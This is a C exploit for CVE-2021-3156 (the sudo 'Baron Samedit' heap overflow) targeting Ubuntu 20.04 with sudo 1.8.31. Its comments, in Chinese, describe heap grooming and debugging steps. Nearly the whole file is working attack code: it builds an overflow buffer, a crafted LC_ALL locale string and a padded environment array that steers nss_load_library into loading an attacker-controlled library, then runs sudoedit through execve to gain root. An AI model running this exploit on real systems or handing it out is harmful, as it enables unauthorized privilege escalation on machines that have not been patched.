/* CVE-2021-3156
Author: Q4n

No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04 LTS
Release:	20.04
Codename:	focal

GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9) stable release version 2.31.

Sudo 版本 1.8.31
Sudoers 策略插件版本 1.8.31
Sudoers 文件语法版本 46
Sudoers I/O plugin version 1.8.31

Refer: 
https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
https://www.kalmarunionen.dk/writeups/sudo/
https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156
https://github.com/blasty/CVE-2021-3156/
https://code.woboq.org/userspace/glibc/nss/nsswitch.h.html#service_user

PS:
    堆风水
    btw, 不知道为啥子进程的aslr没关掉, 全程玄学调试, 搞了一天_(:з」∠)_


*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

#define REP0(X) 
#define REP1(X) X,
#define REP2(X) REP1(X) X,
#define REP3(X) REP2(X) X,
#define REP4(X) REP3(X) X,
#define REP5(X) REP4(X) X,
#define REP6(X) REP5(X) X,
#define REP7(X) REP6(X) X,
#define REP8(X) REP7(X) X,
#define REP9(X) REP8(X) X,
#define REP10(X) REP9(X) X,

#define REP100(X) \
REP10(X) REP10(X) REP10(X) REP10(X) REP10(X) \
REP10(X) REP10(X) REP10(X) REP10(X) REP10(X)

#define REP1000(X) \
REP100(X) REP100(X) REP100(X) REP100(X) REP100(X) \
REP100(X) REP100(X) REP100(X) REP100(X) REP100(X)

char tmp[0x1000];

char overflowbuf[0x1000];
int bufsz = 0;

char hole[0x1000];
int holesz = 0;
#define SUDOEDIT_PATH "/usr/bin/sudoedit"

/* debug: 
直接sudo gdb ./exp
catch exec 
continue
即可进入sudo程序领空
*/
int main(void)
{
    memset(overflowbuf,0,sizeof(overflowbuf));
    memset(hole,0,sizeof(hole));
    int t = 0;

    // 将malloc出来的chunk, 也就是被我们溢出的chunk
    bufsz = 0x190; // realsize + 0x10
    memset(overflowbuf,'B',bufsz);
    overflowbuf[bufsz] = '\\';

    char *argv[] = {
        SUDOEDIT_PATH,
        "-s",
        overflowbuf,
        "\\",
        NULL}; 
    // 0x0000000000000121

    // hole max 0xf0 ==> 0x120
    /* 获得freed chunk
    sudo开始时会setlocale, 用这个来获得tcache中的chunk, 便于之后的heap overflow
    */
    holesz = 0xd0; 
    memset(tmp,'Q',8);
    memset(tmp+8,'A',holesz-8);
    tmp[holesz] = '\0';
    sprintf(hole,"LC_ALL=C.UTF-8@%s",tmp);

    // 这部分调试就是断点下在主要逻辑即可 
    /* 偏移的找法
    当X/X成功写入heap后, 断在 __libc_dlopen_mode, 去查看他的第一个参数和X/X的偏移 
    */
    char *envp[] = {
        "\xef\xbe\xad\xde\\", // b free if $r15==0xc && $r8==0 # 4times
        REP1000("\\")  // \\相当于\x00
        "a\x11\x01\\", //useless
        REP100("\\")
        REP10("\\") 
        REP10("\\")
        REP10("\\")
        REP10("\\")
        REP10("\\")
        REP7("\\")
        "X/X\\", "\\", // b __libc_dlopen_mode 
        // b nss_load_library
        /* files nis compat, 这个地方没搞懂, 就纯玄学
        可能之前不行是因为heap上写的太多, 写掉了一些struct导致程序流不一样了吧...
        */
        "a", // 截断 
        hole, 
        NULL,
    };

    puts("[.] triggering heap overflow...");
    execve(argv[0], argv, envp);
}
